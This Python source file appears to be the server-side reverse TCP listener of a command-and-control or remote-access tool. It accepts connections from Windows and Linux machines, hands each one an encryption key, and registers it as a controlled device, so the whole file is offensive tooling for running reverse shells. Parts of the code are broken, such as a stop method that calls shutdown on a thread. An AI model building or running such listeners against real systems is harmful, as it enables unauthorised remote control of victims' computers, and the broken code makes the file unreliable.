# Reverse Socket TCP Listener
from Utils import *
from Devices.Socket.linux import Linux
from Devices.Socket.windows import Windows
from Listeners.listener import Base_Listener
class Listener(Base_Listener):
    """The Reverse Tcp Listener Class"""
    def __init__(self, server, config, id):
        super().__init__(server, config, id)
        #self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        #self.ssl_context.load_cert_chain(certfile="Data/ssl.pem", keyfile="Data/ssl.key")
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.stopped = False

    def refresh_connections(self):
        # Check if the connections are still alive
        while True:
            # Check if Server is stopped
            device_disconnected = False
            if self.stopped:
                exit()
            for Device in self.devices.values():
                if not Device.alive():
                    self.remove_device(Device)
                    log(f"Connection to {Device.addr}  has been lost. [ID : {Device.id}]",
                        alert="critical")
                    device_disconnected = True
                    break
            if not device_disconnected:
                time.sleep(10)

    def listen(self):
        while True:
            # Check if Server stopped
            if self.stopped:
                exit()
            try:
                # with self.context.wrap_socket(self.socket, server_side=True) as socket:
                connection, addr = self.listener.accept()
            except Exception as e:
                exit()
            else:
                self.key = Fernet.generate_key()
                self.fernet = Fernet(self.key)
                log(f"New Connection established from {addr[0]}", alert="success")
                connection.send(self.key)
                try:
                    operating_system = self.decrypt(connection.recv(1024)).lower()
                except:
                    log(f"Connection to {addr[0]} has been lost.", alert="critical")
                    connection.close()
                    continue
                if operating_system == "windows":
                    self.server.all_devices += 1
                    self.add_device(
                        Windows(connection, addr[0], self.key, self.server.all_devices)) # Create a Windows Object to store the connection
                elif operating_system == "linux":
                    self.server.all_devices += 1
                    self.add_device(
                        Linux(connection, addr[0], self.key, self.server.all_devices)) # Create a Linux Object to store the connection
                else:
                    log(f"Unknown Operating System: {operating_system}",
                        alert="error")
                    connection.close()
                    continue

    def start(self):
        ADDR = (self.address, self.port)
        try:
            self.listener.bind(ADDR)
        except:
            raise Exception("Port is already in use.")
        self.listener.listen()
        # Start the Listener and Refresher
        self.listener_thread = threading.Thread(target=self.listen, name="Listener " + str(self.id))
        self.listener_thread.start()
        self.refresher_thread = threading.Thread(
            target=self.refresh_connections, name="Refresher")
        self.refresher_thread.start()

    def stop(self):
        # Stop the Server
        self.listener_thread.shutdown(socket.SHUT_RDWR)
        self.stopped = True

    def status(self):
        """Get Status of the Server

        Returns:
            bool: True if socket is running, False if not
            bool: True if listener is running, False if not
            bool: True if refresher is running, False if not"""
        # Return the Status of the Server
        return self.stopped, self.listener_thread.is_alive(), self.refresher_thread.is_alive()
